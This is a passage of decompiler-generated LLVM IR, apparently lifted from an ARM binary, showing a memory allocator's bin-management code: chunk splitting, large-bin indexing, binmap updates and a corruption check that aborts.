  br label %dec_label_pc_11f80

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11f94
  %v1_11e48 = add i32 %v3_11f94, 4
  %v2_11e48 = inttoptr i32 %v1_11e48 to i32*
  %v3_11e48 = load i32, i32* %v2_11e48, align 4
  store i32 %v3_11e48, i32* %r3.global-to-local, align 4
  %v0_11e4c = load i32, i32* @sl, align 4
  %v1_11e50 = and i32 %v3_11e48, -4
  store i32 %v1_11e50, i32* %r4.global-to-local, align 4
  %v1_11e54 = add i32 %v3_11f94, 12
  %v2_11e54 = inttoptr i32 %v1_11e54 to i32*
  %v3_11e54 = load i32, i32* %v2_11e54, align 4
  store i32 %v3_11e54, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_11e4c, 255
  br i1 %tmp206, label %dec_label_pc_11eb0, label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e48
  %v9_11e5c = icmp eq i32 %v3_11e54, %v0_11eb4
  br i1 %v9_11e5c, label %dec_label_pc_11e64, label %dec_label_pc_11eb0

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e5c
  %v0_11e64 = load i32, i32* @sb, align 4
  %v1_11e64 = add i32 %v0_11e64, 48
  %v2_11e64 = inttoptr i32 %v1_11e64 to i32*
  %v3_11e64 = load i32, i32* %v2_11e64, align 4
  store i32 %v3_11e64, i32* %r3.global-to-local, align 4
  %v9_11e68 = icmp eq i32 %v3_11f94, %v3_11e64
  br i1 %v9_11e68, label %dec_label_pc_11e70, label %dec_label_pc_11eb0

dec_label_pc_11e70:                               ; preds = %dec_label_pc_11e64
  %v1_11e70 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_11e50, %v1_11e70
  br i1 %tmp207, label %dec_label_pc_11e78, label %dec_label_pc_11eb0

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e70
  %v2_11e78 = sub i32 %v1_11e50, %v0_11e4c
  store i32 %v2_11e78, i32* %r2.global-to-local, align 4
  %v2_11e7c = add i32 %v0_11e4c, %v3_11f94
  store i32 %v2_11e7c, i32* %r3.global-to-local, align 4
  %v1_11e80 = or i32 %v0_11e4c, 1
  store i32 %v1_11e80, i32* %r0.global-to-local, align 4
  %v1_11e84 = or i32 %v2_11e78, 1
  store i32 %v1_11e84, i32* %r1.global-to-local, align 4
  %v1_11e88 = add i32 %v3_11f94, 8
  store i32 %v1_11e88, i32* %r4.global-to-local, align 4
  %v2_11e8c = add i32 %v0_11eb4, 8
  %v3_11e8c = inttoptr i32 %v2_11e8c to i32*
  store i32 %v2_11e7c, i32* %v3_11e8c, align 4
  %v0_11e90 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e90 = load i32, i32* %ip.global-to-local, align 4
  %v2_11e90 = add i32 %v1_11e90, 12
  %v3_11e90 = inttoptr i32 %v2_11e90 to i32*
  store i32 %v0_11e90, i32* %v3_11e90, align 4
  %v0_11e94 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e94 = load i32, i32* @r6, align 4
  %v2_11e94 = add i32 %v1_11e94, 4
  %v3_11e94 = inttoptr i32 %v2_11e94 to i32*
  store i32 %v0_11e94, i32* %v3_11e94, align 4
  %v0_11e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e98 = load i32, i32* @sb, align 4
  %v2_11e98 = add i32 %v1_11e98, 48
  %v3_11e98 = inttoptr i32 %v2_11e98 to i32*
  store i32 %v0_11e98, i32* %v3_11e98, align 4
  %v0_11e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_11e9c = load i32, i32* %r3.global-to-local, align 4
  %v3_11e9c = add i32 %v1_11e9c, %v0_11e9c
  %v4_11e9c = inttoptr i32 %v3_11e9c to i32*
  store i32 %v0_11e9c, i32* %v4_11e9c, align 4
  %v0_11ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ea0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ea0 = add i32 %v1_11ea0, 4
  %v3_11ea0 = inttoptr i32 %v2_11ea0 to i32*
  store i32 %v0_11ea0, i32* %v3_11ea0, align 4
  %v0_11ea4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ea4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ea4 = add i32 %v1_11ea4, 12
  %v3_11ea4 = inttoptr i32 %v2_11ea4 to i32*
  store i32 %v0_11ea4, i32* %v3_11ea4, align 4
  %v0_11ea8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ea8 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ea8 = add i32 %v1_11ea8, 8
  %v3_11ea8 = inttoptr i32 %v2_11ea8 to i32*
  store i32 %v0_11ea8, i32* %v3_11ea8, align 4
  br label %dec_label_pc_125d8

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11e70, %dec_label_pc_11e64, %dec_label_pc_11e5c, %dec_label_pc_11e48
  %v9_11eb0 = icmp eq i32 %v1_11e50, %v0_11e4c
  %v2_11eb4 = add i32 %v3_11e54, 8
  %v3_11eb4 = inttoptr i32 %v2_11eb4 to i32*
  store i32 %v0_11eb4, i32* %v3_11eb4, align 4
  %v0_11eb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11eb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_11eb8 = add i32 %v1_11eb8, 12
  %v3_11eb8 = inttoptr i32 %v2_11eb8 to i32*
  store i32 %v0_11eb8, i32* %v3_11eb8, align 4
  br i1 %v9_11eb0, label %dec_label_pc_12010.loopexit, label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11eb0
  %v0_11ecc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_11ecc, 255
  br i1 %tmp208, label %dec_label_pc_11ef0, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ecc
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v1_11ed8 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ed8 = add i32 %v1_11ed8, ptrtoint (i32* @global_var_219f0.357 to i32)
  %v3_11ed8 = inttoptr i32 %v2_11ed8 to i32*
  %v4_11ed8 = load i32, i32* %v3_11ed8, align 4
  %v3_11edc = udiv i32 %v0_11ecc, 8
  store i32 %v3_11edc, i32* %r0.global-to-local, align 4
  %v4_11ee0 = mul nuw i32 %v3_11edc, 8
  %v5_11ee0 = add i32 %v4_11ed8, %v4_11ee0
  store i32 %v5_11ee0, i32* %r3.global-to-local, align 4
  %v1_11ee4 = add i32 %v5_11ee0, 44
  store i32 %v1_11ee4, i32* %ip.global-to-local, align 4
  %v1_11ee8 = add i32 %v5_11ee0, 52
  %v2_11ee8 = inttoptr i32 %v1_11ee8 to i32*
  %v3_11ee8 = load i32, i32* %v2_11ee8, align 4
  store i32 %v3_11ee8, i32* @lr, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11ef0:                               ; preds = %dec_label_pc_11ecc
  store i32 %v0_11ecc, i32* %r0.global-to-local, align 4
  %v1_11ef4 = call i32 @__malloc_largebin_index(i32 %v0_11ecc)
  store i32 %v1_11ef4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v1_11efc = load i32, i32* %r8.global-to-local, align 4
  %v2_11efc = add i32 %v1_11efc, ptrtoint (i32* @global_var_219f0.357 to i32)
  %v3_11efc = inttoptr i32 %v2_11efc to i32*
  %v4_11efc = load i32, i32* %v3_11efc, align 4
  %v4_11f00 = mul i32 %v1_11ef4, 8
  %v5_11f00 = add i32 %v4_11efc, %v4_11f00
  store i32 %v5_11f00, i32* %r3.global-to-local, align 4
  %v1_11f04 = add i32 %v5_11f00, 44
  store i32 %v1_11f04, i32* %ip.global-to-local, align 4
  %v1_11f08 = add i32 %v5_11f00, 52
  %v2_11f08 = inttoptr i32 %v1_11f08 to i32*
  %v3_11f08 = load i32, i32* %v2_11f08, align 4
  store i32 %v3_11f08, i32* @lr, align 4
  %v9_11f0c = icmp eq i32 %v3_11f08, %v1_11f04
  br i1 %v9_11f0c, label %dec_label_pc_11f48, label %dec_label_pc_11f14

dec_label_pc_11f14:                               ; preds = %dec_label_pc_11ef0
  %v1_11f14 = add i32 %v5_11f00, 56
  %v2_11f14 = inttoptr i32 %v1_11f14 to i32*
  %v3_11f14 = load i32, i32* %v2_11f14, align 4
  store i32 %v3_11f14, i32* %r1.global-to-local, align 4
  %v1_11f18 = add i32 %v3_11f14, 4
  %v2_11f18 = inttoptr i32 %v1_11f18 to i32*
  %v3_11f18 = load i32, i32* %v2_11f18, align 4
  store i32 %v3_11f18, i32* %r3.global-to-local, align 4
  %v0_11f1c = load i32, i32* %r4.global-to-local, align 4
  %v3_11f1c = icmp ult i32 %v0_11f1c, %v3_11f18
  br i1 %v3_11f1c, label %.thread, label %dec_label_pc_11f38.preheader

.thread:                                          ; preds = %dec_label_pc_11f14
  store i32 %v1_11f04, i32* @lr, align 4
  store i32 %v3_11f14, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11f38.preheader:                     ; preds = %dec_label_pc_11f14
  %v2_11f24 = or i32 %v0_11f1c, 1
  store i32 %v2_11f24, i32* %r2.global-to-local, align 4
  %v1_11f38182 = add i32 %v3_11f08, 4
  %v2_11f38183 = inttoptr i32 %v1_11f38182 to i32*
  %v3_11f38184 = load i32, i32* %v2_11f38183, align 4
  store i32 %v3_11f38184, i32* %r3.global-to-local, align 4
  %v3_11f3c186 = icmp ult i32 %v2_11f24, %v3_11f38184
  br i1 %v3_11f3c186, label %dec_label_pc_11f34, label %dec_label_pc_11f44

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f38.preheader, %dec_label_pc_11f34
  %v0_11f44187 = phi i32 [ %v3_11f34, %dec_label_pc_11f34 ], [ %v3_11f08, %dec_label_pc_11f38.preheader ]
  %v1_11f34 = add i32 %v0_11f44187, 8
  %v2_11f34 = inttoptr i32 %v1_11f34 to i32*
  %v3_11f34 = load i32, i32* %v2_11f34, align 4
  store i32 %v3_11f34, i32* @lr, align 4
  %v1_11f38 = add i32 %v3_11f34, 4
  %v2_11f38 = inttoptr i32 %v1_11f38 to i32*
  %v3_11f38 = load i32, i32* %v2_11f38, align 4
  store i32 %v3_11f38, i32* %r3.global-to-local, align 4
  %v3_11f3c = icmp ult i32 %v2_11f24, %v3_11f38
  br i1 %v3_11f3c, label %dec_label_pc_11f34, label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11f34, %dec_label_pc_11f38.preheader
  %v0_11f44.lcssa = phi i32 [ %v3_11f08, %dec_label_pc_11f38.preheader ], [ %v3_11f34, %dec_label_pc_11f34 ]
  %v1_11f44 = add i32 %v0_11f44.lcssa, 12
  %v2_11f44 = inttoptr i32 %v1_11f44 to i32*
  %v3_11f44 = load i32, i32* %v2_11f44, align 4
  store i32 %v3_11f44, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %.thread, %dec_label_pc_11ef0, %dec_label_pc_11ed4, %dec_label_pc_11f44
  %v0_11f68 = phi i32 [ %v1_11f04, %dec_label_pc_11ef0 ], [ %v1_11ee4, %dec_label_pc_11ed4 ], [ %v3_11f44, %dec_label_pc_11f44 ], [ %v3_11f14, %.thread ]
  %v0_11f5c = phi i32 [ %v1_11ef4, %dec_label_pc_11ef0 ], [ %v3_11edc, %dec_label_pc_11ed4 ], [ %v1_11ef4, %dec_label_pc_11f44 ], [ %v1_11ef4, %.thread ]
  %v1_11f4c = phi i32 [ %v1_11efc, %dec_label_pc_11ef0 ], [ %v1_11ed8, %dec_label_pc_11ed4 ], [ %v1_11efc, %dec_label_pc_11f44 ], [ %v1_11efc, %.thread ]
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v2_11f4c = add i32 %v1_11f4c, ptrtoint (i32* @global_var_219f0.357 to i32)
  %v3_11f4c = inttoptr i32 %v2_11f4c to i32*
  %v4_11f4c = load i32, i32* %v3_11f4c, align 4
  %v3_11f50 = sdiv i32 %v0_11f5c, 32
  store i32 %v3_11f50, i32* %r3.global-to-local, align 4
  %v4_11f54 = mul nsw i32 %v3_11f50, 4
  %v5_11f54 = add i32 %v4_11f4c, %v4_11f54
  store i32 %v5_11f54, i32* %r1.global-to-local, align 4
  %v1_11f58 = add i32 %v5_11f54, 820
  %v2_11f58 = inttoptr i32 %v1_11f58 to i32*
  %v3_11f58 = load i32, i32* %v2_11f58, align 4
  %v1_11f5c = urem i32 %v0_11f5c, 32
  store i32 %v1_11f5c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11f64 = shl i32 1, %v1_11f5c
  %v8_11f64 = or i32 %v3_11f58, %v7_11f64
  store i32 %v8_11f64, i32* %r3.global-to-local, align 4
  %v1_11f68 = load i32, i32* @r6, align 4
  %v2_11f68 = add i32 %v1_11f68, 12
  %v3_11f68 = inttoptr i32 %v2_11f68 to i32*
  store i32 %v0_11f68, i32* %v3_11f68, align 4
  %v0_11f6c = load i32, i32* @lr, align 4
  %v1_11f6c = load i32, i32* @r6, align 4
  %v2_11f6c = add i32 %v1_11f6c, 8
  %v3_11f6c = inttoptr i32 %v2_11f6c to i32*
  store i32 %v0_11f6c, i32* %v3_11f6c, align 4
  %v0_11f70 = load i32, i32* %r3.global-to-local, align 4
  %v1_11f70 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f70 = add i32 %v1_11f70, 820
  %v3_11f70 = inttoptr i32 %v2_11f70 to i32*
  store i32 %v0_11f70, i32* %v3_11f70, align 4
  %v0_11f74 = load i32, i32* @r6, align 4
  %v1_11f74 = load i32, i32* @lr, align 4
  %v2_11f74 = add i32 %v1_11f74, 12
  %v3_11f74 = inttoptr i32 %v2_11f74 to i32*
  store i32 %v0_11f74, i32* %v3_11f74, align 4
  %v0_11f78 = load i32, i32* @r6, align 4
  %v1_11f78 = load i32, i32* %ip.global-to-local, align 4
  %v2_11f78 = add i32 %v1_11f78, 8
  %v3_11f78 = inttoptr i32 %v2_11f78 to i32*
  store i32 %v0_11f78, i32* %v3_11f78, align 4
  %v0_11f94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11f94

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11e20, %dec_label_pc_11dd8, %dec_label_pc_11e34
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_11f88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_11f88, i32* @sb, align 4
  %v0_11f8c = load i32, i32* @sl, align 4
  %v1_11f8c = add i32 %v0_11f8c, 16
  store i32 %v1_11f8c, i32* @fp, align 4
  %v1_11f90 = add i32 %v4_11f88, 52
  store i32 %v1_11f90, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f48, %dec_label_pc_11f80
  %v0_11eb4 = phi i32 [ %v0_11f94.pre, %dec_label_pc_11f48 ], [ %v1_11f90, %dec_label_pc_11f80 ]
  %v1_11f94 = add i32 %v0_11eb4, 12
  %v2_11f94 = inttoptr i32 %v1_11f94 to i32*
  %v3_11f94 = load i32, i32* %v2_11f94, align 4
  store i32 %v3_11f94, i32* @r6, align 4
  %v9_11f98 = icmp eq i32 %v3_11f94, %v0_11eb4
  br i1 %v9_11f98, label %dec_label_pc_11fa0, label %dec_label_pc_11e48

dec_label_pc_11fa0:                               ; preds = %dec_label_pc_11f94
  %v0_11fa0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_11fa0, 256
  %v0_12058.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_11fa0.dec_label_pc_12058_crit_edge, label %dec_label_pc_11fa8

dec_label_pc_11fa0.dec_label_pc_12058_crit_edge:  ; preds = %dec_label_pc_11fa0
  %.pre203 = mul i32 %v0_12058.pre, 8
  br label %dec_label_pc_12058

dec_label_pc_11fa8:                               ; preds = %dec_label_pc_11fa0
  %v4_11fa8 = mul i32 %v0_12058.pre, 8
  %v5_11fa8 = add i32 %v4_11fa8, %v0_11eb4
  store i32 %v5_11fa8, i32* %r3.global-to-local, align 4
  %v1_11fac = add i32 %v5_11fa8, -8
  store i32 %v1_11fac, i32* %r1.global-to-local, align 4
  %v1_11fb0 = add i32 %v5_11fa8, 4
  %v2_11fb0 = inttoptr i32 %v1_11fb0 to i32*
  %storemerge.pre = load i32, i32* %v2_11fb0, align 4
  br label %dec_label_pc_12050

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_12050
  %v1_11fb8 = add i32 %v1_11fe0, 4
  %v2_11fb8 = inttoptr i32 %v1_11fb8 to i32*
  %v3_11fb8 = load i32, i32* %v2_11fb8, align 4
  store i32 %v3_11fb8, i32* %r3.global-to-local, align 4
  %v1_11fbc = and i32 %v3_11fb8, -4
  store i32 %v1_11fbc, i32* %r2.global-to-local, align 4
  %v3_11fc0 = icmp ult i32 %v1_11fbc, %v0_11fa0
  %v1_11fc4 = add i32 %v1_11fe0, 12
  %v2_11fc4 = inttoptr i32 %v1_11fc4 to i32*
  %v3_11fc4 = load i32, i32* %v2_11fc4, align 4
  store i32 %v3_11fc4, i32* %r0.global-to-local, align 4
  br i1 %v3_11fc0, label %dec_label_pc_12050, label %dec_label_pc_11fcc

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11fb8
  %v1_11fcc = add i32 %v1_11fe0, 8
  %v2_11fcc = inttoptr i32 %v1_11fcc to i32*
  %v3_11fcc = load i32, i32* %v2_11fcc, align 4
  store i32 %v3_11fcc, i32* %r1.global-to-local, align 4
  %v1_11fd0 = add i32 %v3_11fcc, 12
  %v2_11fd0 = inttoptr i32 %v1_11fd0 to i32*
  %v3_11fd0 = load i32, i32* %v2_11fd0, align 4
  store i32 %v3_11fd0, i32* %r3.global-to-local, align 4
  %v9_11fd4 = icmp eq i32 %v3_11fd0, %v1_11fe0
  br i1 %v9_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_11fe8

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fcc
  %v1_11fdc = add i32 %v3_11fc4, 8
  %v2_11fdc = inttoptr i32 %v1_11fdc to i32*
  %v3_11fdc = load i32, i32* %v2_11fdc, align 4
  store i32 %v3_11fdc, i32* %r3.global-to-local, align 4
  %v9_11fe0 = icmp eq i32 %v3_11fdc, %v1_11fe0
  br i1 %v9_11fe0, label %dec_label_pc_11fec, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fcc, %dec_label_pc_11fdc
  %v0_11fe8 = call i32 @abort()
  store i32 %v0_11fe8, i32* %r0.global-to-local, align 4
  %v0_11fec.pre = load i32, i32* @sl, align 4
  %v1_11fec.pre = load i32, i32* @r2, align 4
  %v0_11ff4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fdc, %dec_label_pc_11fe8
  %v1_11ff4 = phi i32 [ %v3_11fc4, %dec_label_pc_11fdc ], [ %v0_11fe8, %dec_label_pc_11fe8 ]
  %v0_11ff4 = phi i32 [ %v3_11fcc, %dec_label_pc_11fdc ], [ %v0_11ff4.pre, %dec_label_pc_11fe8 ]
  %v1_11fec = phi i32 [ %v1_11fbc, %dec_label_pc_11fdc ], [ %v1_11fec.pre, %dec_label_pc_11fe8 ]
  %v0_11fec = phi i32 [ %v0_11fa0, %dec_label_pc_11fdc ], [ %v0_11fec.pre, %dec_label_pc_11fe8 ]
  %v2_11fec = sub i32 %v1_11fec, %v0_11fec
  store i32 %v2_11fec, i32* %lr.global-to-local, align 4
  %v2_11ff4 = add i32 %v1_11ff4, 8
  %v3_11ff4 = inttoptr i32 %v2_11ff4 to i32*
  store i32 %v0_11ff4, i32* %v3_11ff4, align 4
  %v0_11ff8 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ff8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ff8 = add i32 %v1_11ff8, 12
  %v3_11ff8 = inttoptr i32 %v2_11ff8 to i32*
  store i32 %v0_11ff8, i32* %v3_11ff8, align 4
  %v0_11ffc = load i32, i32* %ip.global-to-local, align 4
  %v1_11ffc = add i32 %v0_11ffc, 8
  store i32 %v1_11ffc, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_11fec, 15
  br i1 %tmp210, label %dec_label_pc_1201c, label %dec_label_pc_12004

dec_label_pc_12004:                               ; preds = %dec_label_pc_11fec
  %v1_12004 = load i32, i32* %r2.global-to-local, align 4
  %v2_12004 = add i32 %v1_12004, %v0_11ffc
  store i32 %v2_12004, i32* %r2.global-to-local, align 4
  %v1_12008 = add i32 %v2_12004, 4
  %v2_12008 = inttoptr i32 %v1_12008 to i32*
  %v3_12008 = load i32, i32* %v2_12008, align 4
  store i32 %v3_12008, i32* %r3.global-to-local, align 4
  store i32 %v1_11ffc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12010

dec_label_pc_12010.loopexit:                      ; preds = %dec_label_pc_11eb0
  %v1_11ebc = load i32, i32* @r6, align 4
  %v2_11ebc = load i32, i32* @sl, align 4
  %v3_11ebc = add i32 %v2_11ebc, %v1_11ebc
  store i32 %v3_11ebc, i32* %r2.global-to-local, align 4
  %v2_11ec0 = add i32 %v3_11ebc, 4
  %v3_11ec0 = inttoptr i32 %v2_11ec0 to i32*
  %v4_11ec0 = load i32, i32* %v3_11ec0, align 4
  store i32 %v4_11ec0, i32* %r3.global-to-local, align 4
  %v2_11ec4 = add i32 %v1_11ebc, 8
  store i32 %v2_11ec4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %.dec_label_pc_12010_crit_edge, %dec_label_pc_12010.loopexit, %dec_label_pc_12004
  %v1_12014 = phi i32 [ %v4_12138, %.dec_label_pc_12010_crit_edge ], [ %v3_11ebc, %dec_label_pc_12010.loopexit ], [ %v2_12004, %dec_label_pc_12004 ]
  %v0_12010 = phi i32 [ %v7_12138, %.dec_label_pc_12010_crit_edge ], [ %v4_11ec0, %dec_label_pc_12010.loopexit ], [ %v3_12008, %dec_label_pc_12004 ]
  %v1_12010 = or i32 %v0_12010, 1
  store i32 %v1_12010, i32* %r3.global-to-local, align 4
  %v2_12014 = add i32 %v1_12014, 4
  %v3_12014 = inttoptr i32 %v2_12014 to i32*
  store i32 %v1_12010, i32* %v3_12014, align 4
  br label %dec_label_pc_125d8

dec_label_pc_1201c:                               ; preds = %dec_label_pc_11fec
  %v1_1201c = load i32, i32* @sl, align 4
  %v2_1201c = add i32 %v1_1201c, %v0_11ffc
  store i32 %v2_1201c, i32* %r2.global-to-local, align 4
  %v1_12020 = or i32 %v1_1201c, 1
  store i32 %v1_12020, i32* %r3.global-to-local, align 4
  %v0_12024 = load i32, i32* %lr.global-to-local, align 4
  %v1_12024 = or i32 %v0_12024, 1
  store i32 %v1_12024, i32* %r1.global-to-local, align 4
  store i32 %v1_11ffc, i32* %r4.global-to-local, align 4
  %v2_1202c = add i32 %v0_11ffc, 4
  %v3_1202c = inttoptr i32 %v2_1202c to i32*
  store i32 %v1_12020, i32* %v3_1202c, align 4
  %v0_12030 = load i32, i32* %r2.global-to-local, align 4
  %v1_12030 = load i32, i32* @r6, align 4
  %v2_12030 = add i32 %v1_12030, 8
  %v3_12030 = inttoptr i32 %v2_12030 to i32*
  store i32 %v0_12030, i32* %v3_12030, align 4
  %v0_12034 = load i32, i32* %r2.global-to-local, align 4
  %v1_12034 = load i32, i32* @r6, align 4
  %v2_12034 = add i32 %v1_12034, 12
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v0_12034, i32* %v3_12034, align 4
  %v0_12038 = load i32, i32* %lr.global-to-local, align 4
  %v1_12038 = load i32, i32* %r2.global-to-local, align 4
  %v3_12038 = add i32 %v1_12038, %v0_12038
  %v4_12038 = inttoptr i32 %v3_12038 to i32*
  store i32 %v0_12038, i32* %v4_12038, align 4
  %v0_1203c = load i32, i32* %r1.global-to-local, align 4
  %v1_1203c = load i32, i32* %r2.global-to-local, align 4
  %v2_1203c = add i32 %v1_1203c, 4
  %v3_1203c = inttoptr i32 %v2_1203c to i32*
  store i32 %v0_1203c, i32* %v3_1203c, align 4
  %v0_12040 = load i32, i32* @r6, align 4
  %v1_12040 = load i32, i32* %r2.global-to-local, align 4
  %v2_12040 = add i32 %v1_12040, 12
  %v3_12040 = inttoptr i32 %v2_12040 to i32*
  store i32 %v0_12040, i32* %v3_12040, align 4
  %v0_12044 = load i32, i32* @r6, align 4
  %v1_12044 = load i32, i32* %r2.global-to-local, align 4
  %v2_12044 = add i32 %v1_12044, 8
  %v3_12044 = inttoptr i32 %v2_12044 to i32*
  store i32 %v0_12044, i32* %v3_12044, align 4
  br label %dec_label_pc_125d8

dec_label_pc_12050:                               ; preds = %dec_label_pc_11fb8, %dec_label_pc_11fa8
  %v1_11fe0 = phi i32 [ %storemerge.pre, %dec_label_pc_11fa8 ], [ %v3_11fc4, %dec_label_pc_11fb8 ]
  store i32 %v1_11fe0, i32* %ip.global-to-local, align 4
  %v9_12050 = icmp eq i32 %v1_11fe0, %v1_11fac
  br i1 %v9_12050, label %dec_label_pc_12058.loopexit, label %dec_label_pc_11fb8

dec_label_pc_12058.loopexit:                      ; preds = %dec_label_pc_12050
  br label %dec_label_pc_12058

dec_label_pc_12058:                               ; preds = %dec_label_pc_11fa0.dec_label_pc_12058_crit_edge, %dec_label_pc_12058.loopexit
  %v4_12088.pre-phi = phi i32 [ %.pre203, %dec_label_pc_11fa0.dec_label_pc_12058_crit_edge ], [ %v4_11fa8, %dec_label_pc_12058.loopexit ]
  %v1_12058 = add i32 %v0_12058.pre, 1
  store i32 %v1_12058, i32* %r2.global-to-local, align 4
  %v1_1205c = urem i32 %v1_12058, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r0.global-to-local, align 4
  %v6_12068 = shl i32 1, %v1_1205c
  store i32 %v6_12068, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12070 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12070, i32* %r3.global-to-local, align 4
  %v3_12074 = udiv i32 %v1_12058, 32
  store i32 %v3_12074, i32* @r5, align 4
  %v4_12078 = mul nuw nsw i32 %v3_12074, 4
  %v5_12078 = add i32 %v4_12070, %v4_12078
  store i32 %v5_12078, i32* %r2.global-to-local, align 4
  %v1_1207c = add i32 %v5_12078, 820
  %v2_1207c = inttoptr i32 %v1_1207c to i32*
  %v3_1207c = load i32, i32* %v2_1207c, align 4
  store i32 %v3_1207c, i32* @r4, align 4
  %v1_12080 = add i32 %v4_12070, 52
  store i32 %v1_12080, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_12088 = add i32 %v1_12080, %v4_12088.pre-phi
  store i32 %v5_12088, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_120f4, %dec_label_pc_12058
  %v1_12094 = phi i32 [ %v1_12094.pre, %dec_label_pc_120f4 ], [ %v3_1207c, %dec_label_pc_12058 ]
  %v0_12094 = phi i32 [ %v0_1208c.pre, %dec_label_pc_120f4 ], [ %v6_12068, %dec_label_pc_12058 ]
  %v1_1208c = sub i32 1, %v0_12094
  %v2_1208c = icmp ult i32 %v0_12094, 2
  %v1_1208c. = select i1 %v2_1208c, i32 %v1_1208c, i32 0
  store i32 %v1_1208c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_12094, %v1_12094
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1208c
  %v5_12098 = or i32 %v1_1208c., 1
  store i32 %v5_12098, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_120a4.preheader

bb145:                                            ; preds = %dec_label_pc_1208c
  %v2_1209c = icmp eq i32 %v1_1208c., 0
  br i1 %v2_1209c, label %.dec_label_pc_120e0.preheader_crit_edge, label %dec_label_pc_120a4.preheader

.dec_label_pc_120e0.preheader_crit_edge:          ; preds = %bb145
  %v0_120d857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120e0.preheader

dec_label_pc_120a4.preheader:                     ; preds = %bb145, %.thread15
  %v0_120a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_120a4

dec_label_pc_120a4:                               ; preds = %dec_label_pc_120a4.preheader, %dec_label_pc_120b0
  %v0_120a4 = phi i32 [ %v0_120a4.pre, %dec_label_pc_120a4.preheader ], [ %v1_120a4, %dec_label_pc_120b0 ]
  %v1_120a4 = add i32 %v0_120a4, 1
  store i32 %v1_120a4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_120a4, 2
  br i1 %tmp211, label %dec_label_pc_12184.loopexit, label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %dec_label_pc_120a4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r3.global-to-local, align 4
  %v1_120b4 = load i32, i32* @r8, align 4
  %v2_120b4 = add i32 %v1_120b4, ptrtoint (i32* @global_var_219f0.357 to i32)
  %v3_120b4 = inttoptr i32 %v2_120b4 to i32*
  %v4_120b4 = load i32, i32* %v3_120b4, align 4
